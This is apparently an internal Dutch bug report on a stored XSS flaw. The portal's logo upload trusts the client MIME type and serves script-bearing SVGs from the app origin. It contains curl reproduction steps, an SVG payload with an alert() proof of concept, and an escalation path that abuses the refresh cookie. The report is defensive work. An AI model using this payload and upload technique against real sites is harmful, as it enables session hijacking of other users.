# B-507 — Organisatielogo: MIME-type wordt blind vertrouwd; een SVG-logo met `<script>` voert JS uit op het portal-domein (stored XSS)

- **Testgeval:** OA-02 / OA-04 (verkennende uitbreiding)
- **Actor / rol:** Org-admin / ORG_ADMIN (en SUPERUSER)
- **App:** API (:3001) `POST|GET /organizations/:id/logo` · zichtbaar via Portal (:5173) en Client-portal (:5174)
- **Severity:** S2 (ernstig — stored XSS op het eigen origin; aanvaller is een ORG_ADMIN, slachtoffer elke gebruiker van die org)
- **Type:** foutgok / security
- **Datum/tijd:** 2026-07-27 14:05

## Verwacht
OA-04: "Logo als `.txt`/`.pdf` (verkeerd type) → geweigerd, geen crash." Een uploadfilter dat alleen
`image/png|jpeg|svg+xml|webp` toestaat, hoort niet af te gaan op wat de *client* als content-type
meestuurt, en actieve inhoud (SVG met `<script>`) hoort niet uitvoerbaar vanaf het app-origin
teruggeserveerd te worden.

## Werkelijk
Twee gekoppelde problemen op `POST /organizations/:id/logo`:

1. **MIME-type wordt niet geverifieerd.** De service kijkt alleen naar `file.mimetype` (de door de
   client meegestuurde header). Een tekstbestand hernoemd naar `.png` en verstuurd met
   `Content-Type: image/png` wordt gewoon geaccepteerd (**201**) en als organisatielogo opgeslagen.
2. **SVG met script wordt ongefilterd opgeslagen én uitgevoerd.** `image/svg+xml` staat in de
   whitelist. Het bestand wordt onveranderd bewaard en door de **publieke** route
   `GET /organizations/:id/logo` teruggegeven met `Content-Type: image/svg+xml`, zonder
   `Content-Disposition: attachment` en zonder CSP. Wie die URL rechtstreeks opent, voert de JS uit
   **in het origin van de portal** (`inspexidemo.localhost`) — hetzelfde origin waarop de gebruiker is
   ingelogd en waar de httpOnly refresh-cookie aan hangt.

De UI-kant is wél netjes: de portal weigert `.txt`/`.pdf` client-side met "Alleen PNG, JPEG, SVG en
WebP zijn toegestaan". Het gat zit dus in de API zelf.

## Reproductie
```bash
OA=<accessToken van admin@inspexi-demo.nl>
ORG=f765ff41-49f7-47a8-9698-13b3a5c1b791

# 1) tekstbestand als PNG
cp notitie.txt spoof.png
curl -s -X POST -H 'Host: inspexidemo.localhost' -H "Authorization: Bearer $OA" \
  -F 'file=@spoof.png;type=image/png' \
  http://localhost:3001/api/v1/organizations/$ORG/logo
# → 201 {"success":true,"data":{"storageKey":"logos/…/….png"}}

# 2) SVG met script
cat > xss-logo.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="50">
  <rect width="100" height="50" fill="#eee"/><text x="5" y="30">logo</text>
  <script type="text/javascript">alert('OA02-XSS:'+document.domain)</script>
</svg>
SVG
curl -s -X POST -H 'Host: inspexidemo.localhost' -H "Authorization: Bearer $OA" \
  -F 'file=@xss-logo.svg;type=image/svg+xml' \
  http://localhost:3001/api/v1/organizations/$ORG/logo
# → 201

# 3) publiek ophalen (zonder token)
curl -sD - -o body.svg -H 'Host: inspexidemo.localhost' \
  http://localhost:3001/api/v1/organizations/$ORG/logo
```
4. Open `http://inspexidemo.localhost:5173/api/v1/organizations/<orgId>/logo` in een browser.

## Bewijs
```
# stap 3 — responseheaders
HTTP/1.1 200 OK
Content-Type: image/svg+xml
(geen Content-Disposition, geen Content-Security-Policy)
# body = het originele SVG inclusief <script>

# stap 4 — headless Chrome op het portal-origin
URL:    http://inspexidemo.localhost:5173/api/v1/organizations/f765ff41-…/logo
DIALOG: alert: OA02-XSS:inspexidemo.localhost
```
Console: geen errors. Het logo rendert in de instellingenpagina als gewone `<img>` (daar wordt het
script níet uitgevoerd — de exploit vereist directe navigatie naar de logo-URL).

## Analyse / vermoedelijke oorzaak
`organizations.service.ts → uploadLogo()`:
```ts
const allowed = ['image/png', 'image/jpeg', 'image/svg+xml', 'image/webp'];
if (!allowed.includes(file.mimetype)) { … }
```
`file.mimetype` komt van multer en is dus attacker-controlled. Er is geen magic-byte-check en geen
SVG-sanitatie. `GET /organizations/:id/logo` is `@Public()` en zet de opgeslagen `mimeType` één-op-één
in de responseheader.

Escalatiepad: een ORG_ADMIN (of een aanvaller die één ORG_ADMIN-account heeft) kan iedereen in de
organisatie die de logo-URL opent JS laten uitvoeren op het portal-origin — inclusief het aanroepen van
`/auth/refresh` met de httpOnly-cookie van het slachtoffer en vervolgens API-calls namens die gebruiker.
Poorten isoleren geen cookies, dus dit raakt ook `:5174` (client-portal) op dezelfde host.

## Advies
1. Valideer de inhoud met magic bytes (bv. `file-type`) in plaats van/naast `file.mimetype`.
2. Sanitize SVG's server-side (DOMPurify/`svg-sanitize`) óf verwijder `image/svg+xml` uit de whitelist.
3. Serveer geüploade bestanden met `Content-Security-Policy: default-src 'none'; sandbox`,
   `X-Content-Type-Options: nosniff` en `Content-Disposition: inline; filename=…` — of vanaf een
   apart, cookieloos assets-domein.
